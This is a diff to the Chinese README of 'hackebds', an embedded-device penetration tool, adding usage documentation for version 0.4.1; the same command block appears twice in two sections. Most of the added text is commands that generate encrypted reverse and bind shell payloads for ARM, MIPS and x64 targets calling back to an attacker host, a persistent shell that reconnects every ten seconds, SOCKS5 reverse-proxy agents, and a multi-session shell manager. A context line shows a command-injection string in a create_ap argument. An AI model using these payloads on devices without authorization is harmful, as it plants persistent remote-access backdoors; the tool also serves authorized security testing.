@@ -3,7 +3,7 @@
 [![Downloads](https://static.pepy.tech/badge/hackebds)](https://pepy.tech/project/hackebds)
 
 
->在嵌入式设备的渗透和漏洞挖掘过程中，遇到了许多问题。一个是一些设备没有telnetd或ssh服务来获得交互式shell，一些设备被防火墙保护，无法与其正向连接需要reverse_shell。bind_shell,socks5反向代理，另一个是内存损坏漏洞（如堆栈溢出）通常是空字节截断，因此构造反向shell代码更麻烦，因此开发此工具是为了利用该漏洞。该工具基于PWN模块开发，目前使用python2语言， 语言已更新到python3，在python3下使用即可，请尽可能在python3.6版本或更高版本使用此工具
+>在嵌入式设备的渗透和漏洞挖掘过程中，遇到了许多问题。一个是一些设备没有telnetd或ssh服务来获得交互式shell，一些设备被防火墙保护，无法与其正向连接需要reverse_shell，另一个是内存损坏漏洞（如堆栈溢出）通常是空字节截断，因此构造反向shell代码更麻烦，因此开发此工具是为了利用该漏洞。该工具基于PWN模块开发，目前使用python2语言， 语言已更新到python3，在python3下使用即可，请尽可能在python3.6版本或更高版本使用此工具
 
 ### 功能
 
@@ -52,6 +52,116 @@
     10.4 **多会话 shell 管理**：内置一个带 tab 补全与历史命令的控制台，可以在一个操作端同时管理多个并发的 shell 会话。
 
     10.5 **统一服务端模式**：将 SOCKS5 代理服务端与多会话 shell 管理器整合到一个控制台中，单个进程即可同时承担内网代理和多 shell 会话管理的工作。
+
+    #### 0.4.1 命令使用方式
+
+    加密反向 shell —— 攻击端监听：
+
+    ```
+    hackebds -server encrypted_shell_reverse -reverse_port 4444 \
+             -cipher chacha20 -encrypt_key "my_secret_key"
+    ```
+
+    加密反向 shell —— 生成目标端 payload（aarch64 / x64 / armelv7）：
+
+    ```
+    hackebds -arch aarch64 -res reverse_shell_file \
+             -reverse_ip <attacker_ip> -reverse_port 4444 \
+             -cipher chacha20 -encrypt_key "my_secret_key" -filename eshell
+
+    hackebds -arch x64 -res reverse_shell_file \
+             -reverse_ip <attacker_ip> -reverse_port 4444 \
+             -cipher chacha20 -encrypt_key "my_secret_key" -filename eshell
+
+    hackebds -arch armelv7 -res reverse_shell_file \
+             -reverse_ip <attacker_ip> -reverse_port 4444 \
+             -cipher chacha20 -encrypt_key "my_secret_key" -filename eshell
+    ```
+
+    完整 PTY 交互终端模式（payload + 服务端）：
+
+    ```
+    hackebds -arch aarch64 -res reverse_shell_file --pty \
+             -reverse_ip <attacker_ip> -reverse_port 4444 \
+             -cipher chacha20 -encrypt_key "my_key" \
+             -shell /bin/bash -filename eshell
+
+    hackebds -server encrypted_shell_reverse --pty \
+             -reverse_port 4444 \
+             -cipher chacha20 -encrypt_key "my_key"
+    ```
+
+    加密 bind shell —— 生成与连接：
+
+    ```
+    hackebds -arch aarch64 -res bind_shell \
+             -bind_port 5555 -passwd "s3cret" \
+             -cipher chacha20 -encrypt_key "my_secret_key" -filename ebind
+
+    hackebds -server encrypted_shell_bind \
+             -reverse_ip <target_ip> -reverse_port 5555 \
+             -cipher chacha20 -encrypt_key "my_secret_key"
+    ```
+
+    持久化加密反向 shell（每 10 秒重连一次）：
+
+    ```
+    hackebds -arch aarch64 -res reverse_shell_file --power -sleep 10 \
+             -reverse_ip <attacker_ip> -reverse_port 4444 \
+             -cipher chacha20 -encrypt_key "my_secret_key" -filename epshell
+    ```
+
+    加密 SOCKS5 反向代理 —— 服务端、Agent 以及带认证：
+
+    ```
+    hackebds -res reverse_proxy_server -arch aarch64 \
+             -agent_port 8888 -socks_port 1080 \
+             -cipher chacha20 -encrypt_key "tunnel_key" -filename server
+
+    hackebds -arch mipsel -res reverse_proxy_file \
+             -reverse_ip <server_ip> -reverse_port 8888 \
+             -cipher chacha20 -encrypt_key "tunnel_key" -filename agent
+
+    hackebds -res reverse_proxy_server -arch x64 \
+             -agent_port 8888 -socks_port 1080 \
+             -socks_auth admin:secretpass \
+             -cipher chacha20 -encrypt_key "key" -filename server
+    ```
+
+    Python 版 SOCKS5 反向服务端：
+
+    ```
+    hackebds -server socks5_reverse \
+             -agent_port 8888 -socks_port 1080 \
+             -socks_auth admin:pass \
+             -cipher chacha20 -encrypt_key "key"
+    ```
+
+    多会话 shell 管理器与统一代理+shell 服务端：
+
+    ```
+    hackebds -server encrypted_shell_manager \
+             -reverse_port 4444 \
+             -cipher chacha20 -encrypt_key "my_key"
+
+    hackebds -server unified \
+             -agent_port 8888 -socks_port 1080 \
+             -reverse_port 4444 \
+             -cipher chacha20 -encrypt_key "my_key"
+    ```
+
+    管理器控制台命令：
+
+    ```
+    hackebds> list                    # 列出所有活动会话
+    hackebds> interact <id>           # 进入指定会话的交互 shell
+    hackebds> kill <id>               # 结束指定会话
+    hackebds> maxconn <n>             # 设置单 IP 最大会话数
+    hackebds> status                  # 显示服务端状态
+    hackebds> notify [on|off]         # 开关新会话通知
+    hackebds> pool                    # 显示代理 agent 池
+    hackebds> exit                    # 停止并退出
+    ```
 
 
 
@@ -459,6 +569,118 @@ create_ap -n wlan0 "Test' && uname -a &&" randompw98zwrd8g283d3
 ```
 
 
+
+### 0.4.1 加密 shell 与 SOCKS5 代理命令使用方式
+
+0.4.1 版本新增了基于 ChaCha20 的加密反向/绑定 shell、纯汇编 SOCKS5 代理 ELF、完整 PTY 交互模式、多会话 shell 管理器以及统一代理+shell 服务端。下面列出所有新增的命令行使用方式。
+
+1) 加密反向 shell —— 攻击端监听：
+
+```
+hackebds -server encrypted_shell_reverse -reverse_port 4444 \
+         -cipher chacha20 -encrypt_key "my_secret_key"
+```
+
+2) 加密反向 shell —— 生成目标端 payload（aarch64 / x64 / armelv7）：
+
+```
+hackebds -arch aarch64 -res reverse_shell_file \
+         -reverse_ip <attacker_ip> -reverse_port 4444 \
+         -cipher chacha20 -encrypt_key "my_secret_key" -filename eshell
+
+hackebds -arch x64 -res reverse_shell_file \
+         -reverse_ip <attacker_ip> -reverse_port 4444 \
+         -cipher chacha20 -encrypt_key "my_secret_key" -filename eshell
+
+hackebds -arch armelv7 -res reverse_shell_file \
+         -reverse_ip <attacker_ip> -reverse_port 4444 \
+         -cipher chacha20 -encrypt_key "my_secret_key" -filename eshell
+```
+
+3) 完整 PTY 交互终端模式（payload + 服务端）：
+
+```
+hackebds -arch aarch64 -res reverse_shell_file --pty \
+         -reverse_ip <attacker_ip> -reverse_port 4444 \
+         -cipher chacha20 -encrypt_key "my_key" \
+         -shell /bin/bash -filename eshell
+
+hackebds -server encrypted_shell_reverse --pty \
+         -reverse_port 4444 \
+         -cipher chacha20 -encrypt_key "my_key"
+```
+
+4) 加密 bind shell —— 生成目标端文件并从攻击端连接：
+
+```
+hackebds -arch aarch64 -res bind_shell \
+         -bind_port 5555 -passwd "s3cret" \
+         -cipher chacha20 -encrypt_key "my_secret_key" -filename ebind
+
+hackebds -server encrypted_shell_bind \
+         -reverse_ip <target_ip> -reverse_port 5555 \
+         -cipher chacha20 -encrypt_key "my_secret_key"
+```
+
+5) 持久化加密反向 shell（每 10 秒重连一次）：
+
+```
+hackebds -arch aarch64 -res reverse_shell_file --power -sleep 10 \
+         -reverse_ip <attacker_ip> -reverse_port 4444 \
+         -cipher chacha20 -encrypt_key "my_secret_key" -filename epshell
+```
+
+6) 加密 SOCKS5 反向代理 —— 服务端、Agent 以及带 RFC 1929 认证：
+
+```
+hackebds -res reverse_proxy_server -arch aarch64 \
+         -agent_port 8888 -socks_port 1080 \
+         -cipher chacha20 -encrypt_key "tunnel_key" -filename server
+
+hackebds -arch mipsel -res reverse_proxy_file \
+         -reverse_ip <server_ip> -reverse_port 8888 \
+         -cipher chacha20 -encrypt_key "tunnel_key" -filename agent
+
+hackebds -res reverse_proxy_server -arch x64 \
+         -agent_port 8888 -socks_port 1080 \
+         -socks_auth admin:secretpass \
+         -cipher chacha20 -encrypt_key "key" -filename server
+```
+
+7) Python 版 SOCKS5 反向服务端：
+
+```
+hackebds -server socks5_reverse \
+         -agent_port 8888 -socks_port 1080 \
+         -socks_auth admin:pass \
+         -cipher chacha20 -encrypt_key "key"
+```
+
+8) 多会话 shell 管理器与统一代理+shell 服务端：
+
+```
+hackebds -server encrypted_shell_manager \
+         -reverse_port 4444 \
+         -cipher chacha20 -encrypt_key "my_key"
+
+hackebds -server unified \
+         -agent_port 8888 -socks_port 1080 \
+         -reverse_port 4444 \
+         -cipher chacha20 -encrypt_key "my_key"
+```
+
+9) 管理器控制台命令：
+
+```
+hackebds> list                    # 列出所有活动会话
+hackebds> interact <id>           # 进入指定会话的交互 shell
+hackebds> kill <id>               # 结束指定会话
+hackebds> maxconn <n>             # 设置单 IP 最大会话数
+hackebds> status                  # 显示服务端状态
+hackebds> notify [on|off]         # 开关新会话通知
+hackebds> pool                    # 显示代理 agent 池
+hackebds> exit                    # 停止并退出
+```
 
 ## chips and architectures
 
